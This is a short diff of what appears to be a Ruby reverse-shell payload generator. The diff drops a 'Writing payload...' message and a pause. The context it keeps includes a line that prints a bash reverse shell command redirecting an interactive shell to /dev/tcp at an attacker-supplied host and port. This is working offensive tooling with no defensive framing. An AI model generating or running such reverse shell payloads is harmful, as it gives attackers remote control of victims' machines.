@@ -42,6 +42,4 @@ shell = options.target_shell
 file = options.output_file
 
 sleep(0.5)
-puts "#{g}Writing payload..."
-sleep(1)
 puts "#{h}#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
